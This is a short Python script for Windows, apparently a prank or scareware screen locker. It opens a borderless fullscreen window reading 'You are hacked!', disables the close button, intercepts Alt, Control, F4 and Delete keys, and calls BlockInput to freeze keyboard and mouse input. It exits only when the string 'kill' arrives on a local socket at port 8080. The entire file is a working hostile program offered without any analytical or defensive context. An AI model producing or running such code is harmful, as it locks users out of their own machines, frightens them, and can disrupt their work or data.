import tkinter as tk
import ctypes
import socket
import os

class HackedGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("You are hacked!")
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_closing)
        self.root.bind("<Key>", self.prevent_key_press)
        self.root.attributes("-fullscreen", True)  # fullscreen mode
        self.root.resizable(False, False)  # prevent resizing
        self.root.overrideredirect(True)  # remove title bar and borders

        label = tk.Label(self.root, text="You are hacked!", font=("Arial", 24))
        label.pack(pady=20)

        # disable Alt+Tab, Alt+F4, Ctrl+Alt+Delete, etc.
        ctypes.windll.user32.BlockInput(True)

        # create a socket to listen for kill signal
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(("localhost", 8080))  # bind to localhost:8080
        self.sock.listen(1)  # listen for incoming connections

    def prevent_closing(self):
        pass  # do nothing when user tries to close the window

    def prevent_key_press(self, event):
        if event.keysym in ["F4", "Delete", "Alt_L", "Alt_R", "Control_L", "Control_R"]:
            return "break"  # prevent Alt+F4, Ctrl+Alt+Delete, etc.

    def run(self):
        self.root.after(100, self.check_for_kill_signal)  # check for kill signal every 100ms
        self.root.mainloop()

    def check_for_kill_signal(self):
        conn, addr = self.sock.accept()  # accept incoming connection
        data = conn.recv(1024)  # receive data
        if data.decode() == "kill":
            os.kill(os.getpid(), 9)  # kill the process with signal 9 (SIGKILL)
        conn.close()  # close the connection
        self.root.after(100, self.check_for_kill_signal)  # check again

if __name__ == "__main__":
    gui = HackedGUI()
    gui.run()
